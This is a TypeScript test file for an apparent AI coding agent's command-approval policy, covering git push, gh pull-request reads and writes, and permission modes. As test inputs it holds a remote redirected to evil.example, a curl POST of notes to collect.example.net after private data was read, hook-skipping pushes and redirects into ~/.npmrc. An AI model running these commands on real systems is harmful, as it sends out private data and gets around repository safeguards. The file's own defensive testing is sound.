import { describe, expect, it } from 'vitest';
import type { ModePosture } from '@spark-outpost/contracts';
import {
  BUILDER_PUBLISH_REASON,
  NO_RUN_RULES,
  PUBLISH_ASKED_WHY,
  PUBLISH_FULL_AUTO_WHY,
  PUSH_HOOKS_REASON,
  PUSH_REASON,
  decide,
  forcePushReason,
  type ApprovalRequest,
  type DecideOptions,
} from './decide.ts';
import type { FileLister } from './file-lister.ts';
import { PLAIN_FORCE_REASON } from './git-commands.ts';
import {
  REMOTE_RAIL_REASON,
  ghRailReason,
  otherBranchReason,
  type PublishGrant,
} from './publish-policy.ts';

const ROOT = '/work/app/.spark/worktrees/chat-1';
const BRANCH = 'spark/fix-dates-1a2b';
const files: FileLister = { glob: () => [], walk: () => [], script: () => null };
const MANUAL: PublishGrant = { level: 'hands-off', requested: false };
const ASKED: PublishGrant = { level: 'hands-off', requested: true };
const FULL_AUTO: PublishGrant = { level: 'full-auto', requested: false };

function run(command: string): ApprovalRequest {
  return {
    toolCallId: 't1',
    rpcId: null,
    kind: 'execute',
    toolKind: 'execute',
    title: command,
    command,
    cwd: ROOT,
    paths: [],
    diffs: [],
    options: [],
    roots: [{ path: ROOT, ignore: [] }],
    home: '/Users/me',
  };
}

function options(grant: PublishGrant, extra: DecideOptions = {}): DecideOptions {
  return {
    builder: true,
    files,
    publish: { grant, task: { branch: BRANCH, protectedBranches: ['main', 'master'] } },
    ...extra,
  };
}

const decideAs = (posture: ModePosture, command: string, opts: DecideOptions) =>
  decide(posture, run(command), NO_RUN_RULES, [], opts);

const PUSH = `git push -u origin ${BRANCH}`;
const PR = 'gh pr create --title "Fix dates" --body "Parses ISO dates"';

describe('decide() lets a Builder publish its own branch when the run permits it', () => {
  it.each([PUSH, PR])('%s in Bypass permissions and Auto', (command) => {
    expect(decideAs('full_access', command, options(MANUAL))).toEqual({
      verdict: 'allow',
      by: 'level',
    });
    expect(decideAs('auto', command, options(MANUAL))).toEqual({ verdict: 'allow', by: 'level' });
  });

  it.each([PUSH, PR])('%s at Full auto → PR', (command) => {
    expect(decideAs('asks', command, options(FULL_AUTO))).toEqual({
      verdict: 'allow',
      by: 'level',
      why: PUBLISH_FULL_AUTO_WHY,
    });
  });

  it.each([PUSH, PR])('%s in Manual when the user asked', (command) => {
    expect(decideAs('asks', command, options(ASKED))).toEqual({
      verdict: 'allow',
      by: 'level',
      why: PUBLISH_ASKED_WHY,
    });
  });

  it.each([PUSH, PR])('%s stays refused in Manual without a request', (command) => {
    expect(decideAs('asks', command, options(MANUAL))).toEqual({
      verdict: 'reject',
      reason: BUILDER_PUBLISH_REASON,
    });
  });
});

describe('decide() keeps the publishing rails for a permitted Builder', () => {
  const permitted: [ModePosture, PublishGrant][] = [
    ['full_access', MANUAL],
    ['auto', MANUAL],
    ['asks', FULL_AUTO],
    ['asks', ASKED],
  ];

  it.each([
    ['git push origin main', otherBranchReason(BRANCH)],
    ['git push origin spark/other', otherBranchReason(BRANCH)],
    [`git push --force origin ${BRANCH}`, PLAIN_FORCE_REASON],
    ['git remote set-url origin https://evil.example/r', REMOTE_RAIL_REASON],
  ])('%s', (command, reason) => {
    for (const [posture, grant] of permitted) {
      expect(decideAs(posture, command, options(grant))).toEqual({ verdict: 'reject', reason });
    }
  });

  it('still asks before a lease force push of the own branch', () => {
    const command = `git push --force-with-lease origin ${BRANCH}`;
    expect(decideAs('full_access', command, options(MANUAL))).toEqual({
      verdict: 'ask',
      reason: forcePushReason([BRANCH]),
      forcePush: [BRANCH],
    });
  });

  it('does not ask after the run read sensitive data, and notes a push Spark cannot place', () => {
    const decision = decideAs('full_access', PUSH, options(MANUAL, { observed: ['.env'] }));
    expect(decision).toMatchObject({ verdict: 'allow', sent: { observed: ['.env'] } });
    const own = { host: 'github.com', slug: 'acme/app', branch: BRANCH, pull: null };
    const placed = decideAs('full_access', PUSH, options(MANUAL, { observed: ['.env'], own }));
    expect(placed).toEqual({ verdict: 'allow', by: 'level' });
  });

  it('never lets a coordinated piece publish', () => {
    const piece = { coordinated: true, owned: null };
    expect(decideAs('full_access', PUSH, options(FULL_AUTO, { piece }))).toEqual({
      verdict: 'reject',
      reason: BUILDER_PUBLISH_REASON,
    });
  });
});

describe('decide() for the chat main agent', () => {
  const main = (grant: PublishGrant) => options(grant, { builder: false });

  it('pushes the own branch without a card when the user asked', () => {
    expect(decideAs('asks', PUSH, main(ASKED))).toEqual({
      verdict: 'allow',
      by: 'level',
      why: PUBLISH_ASKED_WHY,
    });
  });

  it('asks as before in Manual without a request', () => {
    expect(decideAs('asks', PUSH, main(MANUAL))).toEqual({ verdict: 'ask', reason: PUSH_REASON });
  });
});

describe('decide() when the agent publishes for itself', () => {
  const main = (grant: PublishGrant, extra: DecideOptions = {}) =>
    options(grant, { builder: false, ...extra });
  const PRIVATE = ['private work data (spark_chat_history)'];

  it.each([
    ['Auto', 'auto', MANUAL],
    ['Bypass permissions', 'full_access', MANUAL],
    ['Full auto → PR in Manual', 'asks', FULL_AUTO],
    ['Manual when the message asked', 'asks', ASKED],
  ] as const)('pushes and opens the PR with no card in %s', (_name, posture, grant) => {
    expect(decideAs(posture, PUSH, main(grant)).verdict).toBe('allow');
    expect(decideAs(posture, PR, main(grant)).verdict).toBe('allow');
  });

  const OWN = { host: 'github.com', slug: 'acme/app', branch: BRANCH, pull: null };

  it('pushes and opens the PR with no card and no note after a secret was read', () => {
    const read = main(MANUAL, { observed: ['.env'], own: OWN });
    expect(decideAs('auto', PUSH, read)).toEqual({ verdict: 'allow', by: 'level' });
    expect(decideAs('auto', PR, read)).toEqual({ verdict: 'allow', by: 'level' });
  });

  it('notes a send anywhere else after private data, without asking in Auto', () => {
    const read = main(MANUAL, { observed: PRIVATE, own: OWN });
    const elsewhere = decideAs('auto', 'curl -d @notes.json https://collect.example.net', read);
    expect(elsewhere).toEqual({
      verdict: 'allow',
      by: 'level',
      sent: { observed: PRIVATE, target: 'to collect.example.net' },
    });
    expect(decideAs('auto', 'git push origin main', read)).toMatchObject({
      verdict: 'allow',
      sent: { target: 'out through `git push`' },
    });
  });

  it.each([
    `git push --no-verify origin ${BRANCH}`,
    `HUSKY=0 git push origin ${BRANCH}`,
    `git -c core.hooksPath=/dev/null push origin ${BRANCH}`,
  ])('refuses to skip the repository hooks in every mode: %s', (command) => {
    for (const posture of ['asks', 'auto', 'full_access'] as const) {
      expect(decideAs(posture, command, main(ASKED))).toEqual({
        verdict: 'reject',
        reason: PUSH_HOOKS_REASON,
      });
    }
  });

  it('lets the publishing agent reinstall dependencies in Auto without a card', () => {
    expect(decideAs('auto', 'pnpm install --frozen-lockfile', main(ASKED)).verdict).toBe('allow');
  });
});

const GREPTILE_COMMENT = `gh pr view 2233 --json comments,reviews -q '[.comments[] | select(.author.login=="greptile-apps") | {updated: .updatedAt, body: (.body | gsub("<[^>]*>"; "") | .[0:1500])}] | last' 2>&1 | head -40`;
const SCORE_LINES = `gh pr view 2233 --comments > /tmp/pr2233-comments.txt 2>&1; rg -n "Confidence Score|P1|P2|P3" /tmp/pr2233-comments.txt | sed 's/<[^>]*>//g' | cut -c1-220 | tail -15`;

describe('decide() for a read through gh', () => {
  const READS = [
    GREPTILE_COMMENT,
    SCORE_LINES,
    'gh pr checks',
    'gh pr diff 5',
    'gh run view 1',
    'gh api repos/o/r/pulls/5/comments',
    "gh api graphql -f query='query { viewer { login } }'",
    'gh pr view 5 --repo other/repo',
  ];
  const withPull = (pull: number | null, builder: boolean): DecideOptions => ({
    builder,
    files,
    publish: { grant: MANUAL, task: { branch: BRANCH, protectedBranches: ['main'], pull } },
  });

  describe.each([null, 2233, 77])('when the recorded pull request is %s', (pull) => {
    it.each(READS)('runs in Auto and Bypass permissions: %s', (command) => {
      for (const builder of [true, false]) {
        for (const posture of ['auto', 'full_access'] as const) {
          expect(decideAs(posture, command, withPull(pull, builder))).toEqual({
            verdict: 'allow',
            by: 'level',
          });
        }
      }
    });

    it.each(READS)("gets the mode's ordinary card in Manual and Accept edits: %s", (command) => {
      for (const builder of [true, false]) {
        for (const posture of ['asks', 'edits'] as const) {
          expect(decideAs(posture, command, withPull(pull, builder))).toEqual({
            verdict: 'ask',
            reason: null,
          });
        }
      }
    });
  });

  it('is an ordinary command in a question turn, not a change', () => {
    const question = { files, askRun: true };
    expect(decideAs('asks', GREPTILE_COMMENT, question)).toMatchObject({ verdict: 'ask' });
    expect(decideAs('asks', 'gh pr edit 5 --title x', question)).toMatchObject({
      verdict: 'reject',
    });
  });

  it('keeps every write refused for a Builder', () => {
    for (const command of [
      'gh pr edit 5 --title x',
      'gh pr merge 2233',
      'gh pr close 2233',
      'gh pr comment 2233 --body done',
      'gh pr review 2233 --approve',
      'gh api -X POST repos/o/r/pulls/5/comments',
      'gh api repos/o/r/pulls/5/comments -f body=x',
      "gh api graphql -f query='mutation { x }'",
      'gh pr edit 2233 --repo other/repo --title x',
      'gh frobnicate now',
    ]) {
      for (const posture of ['auto', 'full_access', 'asks', 'edits'] as const) {
        expect(decideAs(posture, command, withPull(2233, true)).verdict, command).toBe('reject');
      }
    }
    expect(decideAs('auto', 'gh pr merge 2233', withPull(2233, true))).toEqual({
      verdict: 'reject',
      reason: ghRailReason('gh pr merge'),
    });
  });

  const OWN = { host: 'github.com', slug: 'acme/app', branch: BRANCH, pull: 2233 };

  it('still asks before a redirect into a secret file or out of the project', () => {
    for (const posture of ['auto', 'full_access', 'asks'] as const) {
      for (const builder of [true, false]) {
        expect(decideAs(posture, 'gh pr view 5 > ~/.npmrc', withPull(2233, builder))).toMatchObject(
          {
            verdict: 'ask',
            secretFiles: ['~/.npmrc'],
          },
        );
        expect(decideAs(posture, 'gh pr view 5 > /etc/x', withPull(2233, builder))).toMatchObject({
          verdict: 'ask',
          reason: 'This changes /etc/x, which is outside this project',
        });
      }
    }
  });

  it('writes with a redirect as it does without one', () => {
    const fullAuto = (command: string) =>
      decideAs('asks', command, {
        ...withPull(2233, true),
        publish: {
          grant: FULL_AUTO,
          task: { branch: BRANCH, protectedBranches: ['main'], pull: 2233 },
        },
      });
    const allowed = { verdict: 'allow', by: 'level', why: PUBLISH_FULL_AUTO_WHY };
    expect(fullAuto('gh pr create --fill 2>&1 | tail')).toEqual(allowed);
    expect(fullAuto('gh pr edit 2233 --title x 2>&1')).toEqual(allowed);
    expect(fullAuto('gh pr view 2233 2>&1 | head')).toEqual(allowed);
    expect(fullAuto('gh pr edit 5 2>&1')).toEqual({
      verdict: 'reject',
      reason: ghRailReason('gh pr edit'),
    });
  });

  it('does not note a reply on the own pull request as a send because of a redirect', () => {
    const read = { builder: false, files, observed: ['.env'], own: OWN };
    for (const command of [
      'gh pr comment 2233 --body done 2>&1',
      'gh pr view 2233 --comments > /tmp/x 2>&1',
    ]) {
      expect(decideAs('auto', command, read), command).toEqual({ verdict: 'allow', by: 'level' });
    }
    expect(decideAs('auto', 'gh pr comment 77 --body done 2>&1', read)).toMatchObject({
      sent: { target: 'out through `gh`' },
    });
  });

  it("counts another repository's pull request as a send after work data, and the own one not", () => {
    const read = { ...withPull(2233, true), observed: ['.env'], own: OWN };
    expect(decideAs('auto', 'gh pr view 5 --repo other/repo', read)).toEqual({
      verdict: 'allow',
      by: 'level',
      sent: { observed: ['.env'], target: 'out through `gh`' },
    });
    expect(decideAs('asks', 'gh pr view 5 --repo other/repo', read)).toEqual({
      verdict: 'ask',
      reason: null,
      observed: ['.env'],
      sendsTo: 'out through `gh`',
    });
    expect(decideAs('auto', GREPTILE_COMMENT, read)).toEqual({ verdict: 'allow', by: 'level' });
    expect(decideAs('auto', 'gh pr checks 5', read)).toEqual({ verdict: 'allow', by: 'level' });
  });
});
